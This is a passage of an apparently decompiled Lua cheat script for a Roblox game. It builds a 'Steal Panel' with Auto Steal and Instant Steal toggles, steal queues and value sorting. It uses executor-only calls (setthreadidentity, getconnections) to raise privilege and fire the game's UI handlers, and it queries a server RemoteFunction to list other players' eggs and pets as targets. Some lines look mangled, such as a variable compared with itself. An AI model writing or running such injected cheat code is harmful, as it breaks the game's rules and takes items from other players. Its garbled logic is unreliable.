		local tweenInfo7 = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo8 = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tbl27 = {}

		local function fn32(arg)
			for _, v23 in ipairs(tbl27) do
				pcall(function()
					v23:Cancel()
				end)
			end

			table.clear(tbl27)
			if not arg then
				return
			end

			local function fn33(arg2)
				tbl27[#tbl27 + 1] = arg2
				arg2:Play()
			end

			local gradient = arg.Gradient

			if gradient then
				gradient.Rotation = -115
				gradient.Offset = Vector2.new(-0.30000001192092896, 0)
				fn33(TweenService:Create(gradient, tweenInfo6, { Offset = Vector2.new(0.30000001192092896, 0) }))
				fn33(TweenService:Create(gradient, tweenInfo7, { Rotation = -65 }))
			end

			local light = arg.Light

			if light then
				light.Color = color2(226, 178, 255)
				fn33(TweenService:Create(light, tweenInfo8, { Color = color2(255, 245, 255) }))
			end
		end

		local v23 = setthreadidentity or set_thread_identity

		local function fn33()
			local eggState = tbl.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				local records = nil

				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
						records = result.Records
					end
				end)

				if type(v23) == "function" then
					pcall(v23, 8)
				end

				if records then
					return records
				end
			end

			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return nil
			end
			local flag9 = false
			local records = nil

			task.spawn(function()
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					records = result.Records
				end

				flag9 = true
			end)

			local now = os.clock()

			while not flag9 and os.clock() - now < n6 do
				RunService.Heartbeat:Wait()
			end

			return records
		end

		local function fn34()
			local flag9 = v14 ~= nil
			local enabled

			if flag9 then
				local enabled2 = v14.ActivePets and v14.ActivePets.Enabled

				if enabled2 then
					enabled = enabled2
				else
					enabled = v14.GrowingEggs and v14.GrowingEggs.Enabled
				end
			else
				enabled = flag9
			end

			return enabled or false
		end

		local function fn35()
			local flag9 = false

			for _, v24 in ipairs({ v14.ActivePets, v14.GrowingEggs }) do
				if v24 and v24.Enabled then
					local frame = v24:FindFirstChild("Frame")
					frame = frame and frame:FindFirstChild("Close")
					local flag10 = frame and typeof(getconnections) == "function"
					local flag11 = false

					if flag10 then
						local ok, result = pcall(getconnections, frame.Activated)

						if ok and type(result) == "table" then
							for _, v25 in ipairs(result) do
								if pcall(function()
									v25:Fire()
								end) then
									flag11 = true
								end
							end
						end
					end

					if not flag11 then
						v24.Enabled = false
					end

					flag9 = true
				end
			end

			return flag9
		end

		local function fn36(arg, arg2)
			local column = v14 and v14.Column
			if not column or not column.Parent then
				return
			end

			if tween2 then
				tween2:Cancel()
				tween2 = nil
			end

			local position2 = column.Position
			local udim2 = UDim2.new(position2.X.Scale, arg and math.ceil(column.AbsoluteSize.X * n12) or 0, position2.Y.Scale, position2.Y.Offset)
			if arg2 then
				column.Position = udim2
				return
			end
			tween2 = TweenService:Create(column, arg and tweenInfo3 or tweenInfo4, { Position = udim2 })
			tween2:Play()
		end

		local n19 = 0.106
		local udim2 = UDim2.new(0.955, 0, 0.6, 0)
		local udim22 = UDim2.new(0.955 - n19, 0, 0.6, 0)
		local udim23 = UDim2.new(0.2, 0, 0.56, 0)
		local n20 = 0.955 - n19

		local function fn37(arg, visible)
			if arg and arg.Button.Visible ~= visible then
				arg.Button.Visible = visible
			end
		end

		local function fn38(arg, rank, badgeStyle, arg2)
			local visible = rank ~= nil
			arg.Rank = rank
			fn37(arg.Steal, not visible)
			fn37(arg.Up, visible)
			fn37(arg.Down, visible)
			fn37(arg.Cancel, visible)

			if visible then
				fn30(arg.Up, rank > 1 and tbl17.Hud or tbl17.Queued)
				fn30(arg.Down, rank < (arg2 or rank) and tbl17.Hud or tbl17.Queued)
			end

			fn30(arg.Star, rank == 1 and tbl17.PriorityOn or tbl17.Queued)

			if arg.Badge then
				if arg.Badge.Visible ~= visible then
					arg.Badge.Visible = visible
				end

				if visible then
					fn19(arg.Badge, "#" .. rank)
					badgeStyle = badgeStyle and tbl17.Steal or tbl17.PriorityOn

					if arg.BadgeStyle ~= badgeStyle and arg.BadgeGradient then
						arg.BadgeStyle = badgeStyle
						arg.BadgeGradient.Color = badgeStyle.Color
						arg.BadgeGradient.Rotation = 90
					end
				end
			end
		end

		local function fn39()
			if not tbl21 then
				return
			end
			local v24 = tbl4.Toggle(v5, false)

			if tbl21.On ~= v24 then
				tbl21.On = v24
				fn30(tbl21.Toggle, v24 and tbl17.Steal or tbl17.Cancel)
				fn19(tbl21.Toggle.Label, v24 and "Auto Steal: ON" or "Auto Steal: OFF")
			end

			local guardOn = tbl4.SafeCarry.LineDrop == true

			if tbl21.Guard and tbl21.GuardOn ~= guardOn then
				tbl21.GuardOn = guardOn
				fn30(tbl21.Guard, guardOn and tbl17.Steal or tbl17.Cancel)
				fn19(tbl21.Guard.Label, guardOn and "Instant Steal: ON" or "Instant Steal: OFF")
			end

			if v19 and tbl21.SortShown ~= v4 then
				tbl21.SortShown = v4
				fn19(v19.Label, "Sort: " .. tostring(v4))
			end
		end

		local n21 = 4
		local tbl28 = {}
		local tbl29 = {}

		local function fn40()
			if not v20 then
				return
			end
			fn39()
			local tbl30 = {}

			for _, v24 in pairs(tbl24) do
				table.insert(tbl30, v24)
			end

			local tbl31 = {}
			local v24 = nil

			if type(tbl4.StealPlan) == "function" then
				task.spawn(function()
					local ok, result, result2 = pcall(tbl4.StealPlan)

					if ok and type(result) == "table" then
						tbl31 = result
						v24 = result2
					end
				end)
			end

			local tbl32 = {}

			for i, v25 in ipairs(tbl31) do
				if tbl32[v25] == nil then
					tbl32[v25] = i
				end
			end

			local v25 = v4

			table.sort(tbl30, function(arg, arg2)
				local v26 = tbl32[arg.Uid]
				local v27 = tbl32[arg2.Uid]
				if v26 ~= nil ~= v27 ~= nil then
					return v26 ~= nil
				end

				if v26 and v27 then
					return v26 < v27
				end

				if v25 == tbl5[1] and arg.Style.RarityNumber ~= arg2.Style.RarityNumber then
					return arg.Style.RarityNumber > arg2.Style.RarityNumber
				end
				local flag9 = v25 == tbl5[2]

				if flag9 then
					flag9 = (arg.Weight or 0) ~= (arg2.Weight or 0)
				end

				if flag9 then
					return (arg.Weight or 0) > (arg2.Weight or 0)
				end

				if v25 == tbl5[5] and arg.Value ~= arg2.Value then
					return arg.Value < arg2.Value
				end

				if arg.Value ~= arg2.Value then
					return arg.Value > arg2.Value
				end
				return arg.Uid < arg2.Uid
			end)

			local now = os.clock()
			local tbl33 = {}
			local tbl34 = {}

			for _, v26 in ipairs(tbl30) do
				local v27 = tbl28[v26.Uid]

				if v27 and v27 > now and tbl29[v26.Uid] then
					table.insert(tbl34, v26)
				else
					tbl28[v26.Uid] = nil
					table.insert(tbl33, v26)
				end
			end

			table.sort(tbl34, function(arg, arg2)
				return tbl29[arg.Uid] < tbl29[arg2.Uid]
			end)

			for _, v26 in ipairs(tbl34) do
				table.insert(tbl33, math.clamp(tbl29[v26.Uid], 1, #tbl33 + 1), v26)
			end

			table.clear(tbl29)

			for i, v26 in ipairs(tbl33) do
				tbl29[v26.Uid] = i
				local v27 = tbl23[v26.Uid]

				if v27 then
					if v27.Frame.LayoutOrder ~= i then
						v27.Frame.LayoutOrder = i
					end

					fn38(v27, tbl32[v26.Uid], v26.Uid == v24, #tbl31)
				end
			end
		end

		local function fn41()
			if not v20 then
				return
			end
			local n22 = math.max(1, math.floor(v20.AbsoluteSize.X / n10 + 0.5))
			if n22 == n14 then
				return
			end
			n14 = n22

			for _, v24 in pairs(tbl23) do
				v24.Frame.Size = UDim2.new(1, 0, 0, n22)
			end
		end

		local function fn42(arg)
			local clone = v21:Clone()
			local spacer = clone:FindFirstChild("Spacer")
			local textLabel = spacer:FindFirstChild("TextLabel")

			local tbl30 = {
				Uid = arg,
				Frame = clone,
				Icon = spacer:FindFirstChild("Icon"),
				Label = textLabel,
				ValueLabel = spacer:FindFirstChild("Value"),
				DetailLabel = spacer:FindFirstChild("Detail"),
			}

			tbl30.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
			tbl30.Steal = fn29(spacer:FindFirstChild("Unequip"))
			tbl30.Cancel = fn29(spacer:FindFirstChild("Cancel"))
			tbl30.Star = fn29(spacer:FindFirstChild("Star"))
			tbl30.Up = fn29(spacer:FindFirstChild("Up"))
			tbl30.Down = fn29(spacer:FindFirstChild("Down"))
			tbl30.Badge = spacer:FindFirstChild("Rank")
			tbl30.BadgeGradient = tbl30.Badge and tbl30.Badge:FindFirstChildOfClass("UIGradient") or nil

			if textLabel and not tbl30.Gradient then
				tbl30.Gradient = Instance.new("UIGradient")
				tbl30.Gradient.Parent = textLabel
			end

			fn31(tbl30.Steal)
			fn31(tbl30.Cancel)
			fn31(tbl30.Star)
			fn31(tbl30.Up)
			fn31(tbl30.Down)

			for _, v24 in ipairs({ { tbl30.Up, -1 }, { tbl30.Down, 1 } }) do
				if v24[1] then
					v24[1].Button.Activated:Connect(function()
						if type(tbl4.MoveInPlan) == "function" then
							tbl4.MoveInPlan(tbl30.Uid, v24[2])
						end

						tbl4.UiDefer(fn40)
					end)
				end
			end

			if tbl30.Steal then
				tbl30.Steal.Button.Activated:Connect(function()
					if tbl30.Rank == nil and type(tbl4.StealNow) == "function" then
						tbl4.StealNow(tbl30.Uid, false)
					end

					tbl4.UiDefer(fn40)
				end)
			end

			if tbl30.Cancel then
				tbl30.Cancel.Button.Activated:Connect(function()
					tbl28[tbl30.Uid] = os.clock() + n21

					if type(tbl4.CancelSteal) == "function" then
						tbl4.CancelSteal(tbl30.Uid)
					end

					tbl4.UiDefer(fn40)
				end)
			end

			if tbl30.Star then
				tbl30.Star.Button.Activated:Connect(function()
					if type(tbl4.PrioritizeSteal) == "function" then
						tbl4.PrioritizeSteal(tbl30.Uid)
					end

					tbl4.UiDefer(fn40)
				end)
			end

			fn26(clone, true)
			fn23(clone)
			clone.Size = UDim2.new(1, 0, 0, math.max(n14, 1))
			clone.Visible = true
			clone.Parent = v20
			return tbl30
		end

		local function fn43(arg, arg2)
			local style = arg2.Style

			if arg.Category ~= arg2.Category then
				arg.Category = arg2.Category

				if arg.Icon then
					arg.Icon.Image = style.Icon
				end

				if arg.Gradient then
					arg.Gradient.Color = style.GradientColor
					arg.Gradient.Rotation = style.GradientRotation
				end
			end

			fn19(arg.Label, style.Name)
			fn19(arg.ValueLabel, fn18(arg2.Value))
			fn19(arg.DetailLabel, arg2.Detail or "")
		end

		local function fn44(arg)
			local n22 = tonumber(arg) or 0
			local str = n22 >= 1000 and string.format("%.0f", n22) or string.format("%.2f", n22)
			local v24, v25 = string.match(str, "^(%-?%d+)(%.%d+)$")
			v24 = v24 or str
			local v26

			while true do
				local v27
				v26, v27 = string.gsub(v24, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if v27 == 0 then
					break
				else
					v24 = v26
				end
			end

			return v26 .. (v25 or "") .. " Kg"
		end

		local function fn45(arg, arg2)
			local str = string.format("x%.2f", arg2)
			local eggRecords = tbl.EggRecords
			local flag9 = type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function"
			local n22 = 0

			if flag9 then
				local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)

				if ok and tonumber(result) then
					n22 = tonumber(result)
					str ..= "  " .. utf8.char(183) .. "  " .. fn44(result)
				end
			end

			return str, n22
		end

		local fn46 = nil

		local function fn47(arg)
			local v24 = fn33()

			if v24 and arg == n13 and flag2 then
				local tbl30 = {}
				local now = os.clock()
				local n22 = -1
				local v25 = nil

				for _, v26 in pairs(v24) do
					local uid = type(v26) == "table" and v26.Uid or nil
					local flag9 = v26.State == "Slot" or v26.State == "Dropped" or v26.State == "Carried"

					if type(uid) == "string" and flag9 and type(v26.AssetCategory) == "string" then
						tbl30[uid] = true
						local v27 = fn16(v26.AssetCategory)
						local tbl31 = tbl24[uid]

						if not tbl31 then
							tbl31 = { Uid = uid }
							tbl24[uid] = tbl31
						end

						local scale = tonumber(v26.AssetScale) or 1

						if tbl31.Detail == nil or tbl31.Scale ~= scale or tbl31.Category ~= v26.AssetCategory then
							tbl31.Scale = scale
							local v28, v29 = fn45(v26.AssetCategory, scale)
							tbl31.Detail = v28
							tbl31.Weight = v29
						end

						tbl31.Category = v26.AssetCategory
						tbl31.Style = v27
						tbl31.Value = fn17(v26, v27)
						tbl31.Position = typeof(v26.BottomCFrame) == "CFrame" and v26.BottomCFrame.Position or nil

						if (v26.State == "Slot" or v26.State == "Dropped") and v27.Icon ~= "" and tbl31.Value > n22 then
							n22 = tbl31.Value
							v25 = tbl31
						end

						if flag4 and v20 then
							local v28 = tbl23[uid]

							if not v28 then
								v28 = fn42(uid)
								tbl23[uid] = v28
							end

							fn43(v28, tbl31)
						end
					end

					if not (n5 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if arg ~= n13 or not flag2 then
						return
					end
				end

				for k in pairs(tbl24) do
					if not tbl30[k] then
						tbl24[k] = nil
						local v26 = tbl23[k]

						if v26 then
							tbl23[k] = nil
							v26.Frame:Destroy()
						end
					end
				end

				if imageLabel and v25 and imageLabel.Image ~= v25.Style.Icon then
					imageLabel.Image = v25.Style.Icon
				end

				fn40()
			end
		end

		local n22 = 0

		local function fn48(arg)
			if flag7 and os.clock() - n22 < 10 then
				flag8 = true
				return
			end
			flag7 = true
			n22 = os.clock()
			pcall(fn47, arg)

			if n22 == n22 then
				flag7 = false
			end

			if flag8 then
				flag8 = false
				fn46()
			end
		end

		fn46 = function()
			if flag6 or not flag2 then
				return
			end
			flag6 = true
			local v24 = n13

			task.delay(flag4 and 0.15 or 1, function()
				flag6 = false

				if flag2 and v24 == n13 then
					task.spawn(pcall, fn48, v24)
				end
			end)
		end

		local function fn49(arg)
			if flag4 or not v18 then
				return
			end
			flag4 = true

			if arg then
				v22:Set(true)
			end

			if fn35() then
				RunService.Heartbeat:Wait()
				if not flag4 or not v18 then
					return
				end
			end

			fn36(true)
			v17.Enabled = true

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			v18.Position = UDim2.new(position.X.Scale, math.ceil(v18.AbsoluteSize.X * n11), scale, offset)
			tween = TweenService:Create(v18, tweenInfo, { Position = position })
			tween:Play()
			fn28()
			fn41()
			task.spawn(pcall, fn48, n13)
		end

		local function fn50(arg, arg2)
			if not flag4 or not v18 then
				return
			end
			flag4 = false

			if arg2 then
				v22:Set(false)
			end

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			local tween3 = TweenService:Create(v18, tweenInfo2, { Position = UDim2.new(position.X.Scale, math.ceil(v18.AbsoluteSize.X * n11), scale, offset) })
			tween = tween3

			tween3.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed and tween == tween3 and not flag4 and v17 then
					v17.Enabled = false
					v18.Position = position
				end
			end)

			tween3:Play()

			if arg then
				fn36(false)
			end
		end

		local function createScreenGui(arg)
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = arg.IgnoreGuiInset
			screenGui.ZIndexBehavior = arg.ZIndexBehavior
			screenGui.DisplayOrder = arg.DisplayOrder

			pcall(function()
				screenGui.ScreenInsets = arg.ScreenInsets
			end)

			return screenGui
		end

		local function fn51()
			if v15 and v15.Parent and v16 and v16.Button then
				return true
			end
			local v24 = fn22(v14.Pets)
			if not v24 then
				return false
			end

			for _, v25 in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
				local v26 = v24:FindFirstChild(v25)

				if v26 then
					v26:Destroy()
				end
			end

			v16 = fn29(v24)
			imageLabel = v24:FindFirstChild("ImageLabel")

			if v16.Scale then
				v16.Scale.Scale = 1
			end

			fn30(v16, tbl17.Chilli)
			fn31(v16)
			fn32(v16)
			v24.AnchorPoint = Vector2.new(0.5, 0.5)
			v24.LayoutOrder = 0

			v24.Activated:Connect(function()
				tbl4.UiDefer(function()
					if not v17 or not v17.Parent then
						pcall(fn20)

						tbl4.UiDefer(function()
							if v17 and not flag4 then
								pcall(fn49, true)
							end
						end)

						return
					end

					if flag4 then
						fn50(true, true)
					else
						fn49(true)
					end
				end)
			end)

			fn26(v24)
			fn23(v24)
			v15 = createScreenGui(v14.Hud)
			v24.Parent = v15
			v15.Parent = v3
			return true
		end

		local v24 = nil
		local v25 = nil

		local function fn52()
			local button = v16 and v16.Button
			local eggs = v14.Eggs
			local pets = v14.Pets
			if not button or not eggs.Parent or not pets.Parent then
				return
			end

			if v14.Hud.Enabled and v14.GameHud.Visible and v14.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
				local uiScale = eggs:FindFirstChildOfClass("UIScale")
				local scale = uiScale and uiScale.Scale or 1

				if scale <= 0 then
					scale = 1
				end

				local n23 = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
				local n24 = pets.AbsolutePosition + pets.AbsoluteSize / 2
				local n25 = eggs.AbsoluteSize / scale
				local absolutePosition = v15.AbsolutePosition
				local udim24 = UDim2.fromOffset(n23.X - absolutePosition.X, n23.Y - n24.Y - n23.Y - absolutePosition.Y)
				local udim25 = UDim2.fromOffset(n25.X, n25.Y)

				if not flag4 then
					v24 = udim24
					v25 = udim25
				end

				if button.Position ~= udim24 then
					button.Position = udim24
				end

				if button.Size ~= udim25 then
					button.Size = udim25
					fn27()
				end
			elseif not flag4 and v24 then
				if button.Position ~= v24 then
					button.Position = v24
				end

				if v25 and button.Size ~= v25 then
					button.Size = v25
					fn27()
				end
			end

			if button.Visible ~= true then
				button.Visible = true
			end
		end

		local function fn53()
			local frame = v14.ActivePets.Frame
			local v26 = fn22(frame)
			if not v26 then
				return false
			end
			local header = v26:FindFirstChild("Header")
			local scrollingFrame = v26:FindFirstChild("ScrollingFrame")
			local close = v26:FindFirstChild("Close")
			local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
			local spacer = template and template:FindFirstChild("Spacer")
			local unequip = spacer and spacer:FindFirstChild("Unequip")
			local textLabel = spacer and spacer:FindFirstChild("TextLabel")
			if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
				v26:Destroy()
				return false
			end

			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
					child:Destroy()
				end
			end

			local equipBest = v26:FindFirstChild("EquipBest")

			if equipBest then
				equipBest:Destroy()
			end

			local uiAspectRatioConstraint = v26:FindFirstChildOfClass("UIAspectRatioConstraint")
			local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
			local flag9 = not UserInputService.MouseEnabled
			local n23 = flag9 and 1.2 or 1
			flag9 = flag9 and 1.15 or 1
			local aspectRatio2 = n9 / flag9
			local n24 = aspectRatio2 / aspectRatio
			tbl22 = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
			v26.Size = UDim2.new(n7 * n23, 0, n8 * n23 * flag9, 0)

			if not uiAspectRatioConstraint then
				uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Parent = v26
			end

			uiAspectRatioConstraint.AspectRatio = aspectRatio2
			uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
			header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * n24, header.Size.Y.Offset)
			header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * n24, header.Position.Y.Offset)
			close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * n24, close.Size.Y.Offset)
			close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
			local scale = scrollingFrame.Size.Y.Scale
			local scale2 = scrollingFrame.Position.Y.Scale
			local y = scrollingFrame.AnchorPoint.Y
			local n25 = (scale2 - scale * y) * n24
			local n26 = 1 - (1 - scale2 + scale * (1 - y)) * n24
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n26 - n25, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n25 + (n26 - n25) * y, 0)
			local scale3 = scrollingFrame.Size.Y.Scale
			local y2 = scrollingFrame.AnchorPoint.Y
			local n27 = scrollingFrame.Position.Y.Scale - scale3 * y2
			local n28 = n27 + scale3
			local n29 = 0.1 * n24
			local n30 = 0.02 * n24
			local frame2 = Instance.new("Frame")
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.AnchorPoint = Vector2.new(0.5, 0)
			frame2.Position = UDim2.new(0.5, 0, n27 + n30, 0)
			frame2.Size = UDim2.new(0.9, 0, n29, 0)
			frame2.Parent = v26
			local n31 = n27 + n30 * 1.5 + n29
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n28 - n31, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n31 + (n28 - n31) * y2, 0)
			local clone = unequip:Clone()
			clone.AnchorPoint = Vector2.new(0, 0.5)
			clone.Position = UDim2.new(0, 0, 0.5, 0)
			clone.Size = UDim2.new(0.37, 0, 1, 0)
			clone.Parent = frame2
			local v27 = fn29(clone)
			fn31(v27)

			clone.Activated:Connect(function()
				local v28 = v5
				local flag10 = v5

				if v28 then
					flag10 = type(v28.Set) == "function"
				end

				if flag10 then
					pcall(v28.Set, v28, not tbl4.Toggle(v28, false))
				end

				tbl4.UiDefer(fn39)
			end)

			local clone2 = unequip:Clone()
			clone2.Parent = frame2
			local v28 = fn29(clone2)
			fn31(v28)

			clone2.Activated:Connect(function()
				local safeCarry = tbl4.SafeCarry
				local lineDrop = not safeCarry.LineDrop
				local instantHandle = safeCarry.InstantHandle

				if instantHandle and type(instantHandle.Set) == "function" then
					pcall(instantHandle.Set, instantHandle, lineDrop)
				end

				safeCarry.LineDrop = lineDrop
				tbl4.UiDefer(fn39)
			end)

			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Padding = UDim.new(0.06, 0)
			uiListLayout.Parent = frame2
			clone.Size = UDim2.new(0.46, 0, 1, 0)
			clone.LayoutOrder = 1
			clone2.Size = UDim2.new(0.46, 0, 1, 0)
			clone2.LayoutOrder = 2
			tbl21 = { Toggle = v27, Guard = v28 }

			tbl4.StealPanelSync = function()
				tbl4.UiDefer(fn39)
			end

			local uiGradient = header:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				local v29 = fn15
				local tbl30 = {}
				local tbl31 = { 0, color2(200, 18, 24) }
				local tbl32 = { 0.53, color2(255, 88, 90) }
				local tbl33 = { 1, color2(214, 28, 34) }
				tbl30[1] = tbl31
				tbl30[2] = tbl32
				tbl30[3] = tbl33
				uiGradient.Color = v29(tbl30)
			end

			title = header:FindFirstChild("Title")
			fn19(title, "Steal Panel")
			local plusEquip = header:FindFirstChild("PlusEquip")
			v19 = fn29(plusEquip)

			if v19 then
				fn30(v19, tbl17.Steal)
				fn19(v19.Label, "Sort: " .. tostring(v4))
				fn31(v19)
				local n32 = 0

				local function fn54()
					if os.clock() - n32 < 0.25 then
						return
					end
					n32 = os.clock()
					local v29 = tbl5[(table.find(tbl5, v4) or 4) % #tbl5 + 1]
					local priorityHandle = tbl4.Steal.PriorityHandle

					if priorityHandle and type(priorityHandle.Set) == "function" then
						pcall(priorityHandle.Set, priorityHandle, v29)
					end

					if v4 ~= v29 then
						v4 = v29

						if type(tbl4.ResortSteal) == "function" then
							tbl4.ResortSteal()
						end
					end

					tbl4.UiDefer(function()
						fn19(v19.Label, "Sort: " .. tostring(v4))
						fn40()
					end)
				end

				pcall(function()
					plusEquip.Active = true
					plusEquip.Interactable = true
					plusEquip.AutoButtonColor = true
				end)

				for _, descendant in ipairs(plusEquip:GetDescendants()) do
					if descendant:IsA("GuiObject") then
						pcall(function()
							descendant.Active = false
						end)
					end
				end

				plusEquip.Activated:Connect(fn54)

				plusEquip.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						fn54()
					end
				end)
			end

			local v29 = fn29(close)
			fn31(v29)

			close.Activated:Connect(function()
				tbl4.UiDefer(function()
					fn50(true, true)
				end)
			end)

			local clone3 = unequip:Clone()
			clone3.Name = "Cancel"
			clone3.Parent = spacer
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
			uiAspectRatioConstraint2.Parent = clone3
			unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
			unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
			clone3.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
			clone3.Position = UDim2.new(0.965, 0, 0.5, 0)
			local icon = spacer:FindFirstChild("Icon")

			if icon then
				icon.AnchorPoint = Vector2.new(0.5, 0.5)
				icon.Size = UDim2.new(0.2, 0, 1.3, 0)
				icon.Position = UDim2.new(0.1, 0, 0.5, 0)
			end

			textLabel.AnchorPoint = Vector2.new(textLabel.AnchorPoint.X, 0.5)
			textLabel.Size = UDim2.new(0.38, 0, 0.3, 0)
			textLabel.Position = UDim2.new(0.415, 0, 0.2, 0)
			fn19(textLabel, "")
			local clone4 = textLabel:Clone()
			clone4.Name = "Value"
			clone4.Size = UDim2.new(0.38, 0, 0.23, 0)
			clone4.Position = UDim2.new(0.415, 0, 0.48, 0)
			local uiGradient2 = clone4:FindFirstChildOfClass("UIGradient")

			if not uiGradient2 then
				uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Parent = clone4
			end

			uiGradient2.Color = tbl17.Steal.Color
			uiGradient2.Rotation = tbl17.Steal.Rotation
			clone4.Parent = spacer
			local clone5 = clone4:Clone()
			clone5.Name = "Detail"
			clone5.Size = UDim2.new(0.4, 0, 0.3, 0)
			clone5.Position = UDim2.new(0.415, 0, 0.78, 0)
			local uiGradient3 = clone5:FindFirstChildOfClass("UIGradient")

			if uiGradient3 then
				uiGradient3.Color = tbl17.Hud.Color
				uiGradient3.Rotation = tbl17.Hud.Rotation
			end

			clone5.Parent = spacer
			local v30 = fn29(unequip)
			fn19(v30.Label, "Steal")
			fn30(v30, tbl17.Steal)
			local v31 = fn29(clone3)
			fn19(v31.Label, "X")
			fn30(v31, tbl17.Cancel)
			clone3.Position = udim2
			clone3.Visible = false
			unequip.Position = udim22
			unequip.Size = udim23
			local clone6 = clone3:Clone()
			clone6.Name = "Star"
			clone6.AnchorPoint = Vector2.new(1, 0.5)
			clone6.Size = UDim2.new(0.1, 0, 0.56, 0)
			clone6.Position = udim2
			clone6.Visible = true
			clone6.Parent = spacer
			local v32 = fn29(clone6)
			fn19(v32.Label, utf8.char(9733))
			fn30(v32, tbl17.Queued)
			local v33 = ipairs
			local tbl30 = {}
			local tbl31 = {}
			local v34 = utf8.char(9650)
			local n32 = n20 - n19
			tbl31[1] = "Up"
			tbl31[2] = v34
			tbl31[3] = n32
			local tbl32 = {}
			local v35 = utf8.char(9660)
			tbl32[1] = "Down"
			tbl32[2] = v35
			tbl32[3] = n20
			tbl30[1] = tbl31
			tbl30[2] = tbl32

			for _, v36 in v33(tbl30) do
				local clone7 = clone3:Clone()
				clone7.Name = v36[1]
				clone7.AnchorPoint = Vector2.new(1, 0.5)
				clone7.Size = UDim2.new(0.1, 0, 0.56, 0)
				clone7.Position = UDim2.new(v36[3], 0, 0.6, 0)
				clone7.Visible = false
				clone7.Parent = spacer
				local v37 = fn29(clone7)
				fn19(v37.Label, v36[2])
				fn30(v37, tbl17.Hud)
			end

			clone3.AnchorPoint = Vector2.new(1, 0)
			clone3.Position = UDim2.new(0.99, 0, 0.04, 0)
			clone3.Size = UDim2.new(0.06, 0, 0.28, 0)
			clone3.ZIndex = 8

			for _, descendant in ipairs(clone3:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.ZIndex = descendant.ZIndex + 8
				end
			end

			local clone7 = clone4:Clone()
			clone7.Name = "Rank"
			clone7.AnchorPoint = Vector2.new(0, 0)
			clone7.Position = UDim2.new(0.012, 0, 0.03, 0)
			clone7.Size = UDim2.new(0.1, 0, 0.36, 0)
			clone7.TextXAlignment = Enum.TextXAlignment.Left
			clone7.ZIndex = 6
			clone7.Visible = false
			fn19(clone7, "#1")
			local uiGradient4 = clone7:FindFirstChildOfClass("UIGradient")

			if uiGradient4 then
				uiGradient4.Color = tbl17.PriorityOn.Color
				uiGradient4.Rotation = 90
			end

			clone7.Parent = spacer
			template.Visible = false
			template.Parent = nil
			v21 = template
			v20 = scrollingFrame
			v18 = v26
			position = frame.Position
			v26.Position = position
			fn26(v26, true)
			fn23(v26)
			v17 = createScreenGui(v14.ActivePets)
			v17.Enabled = false
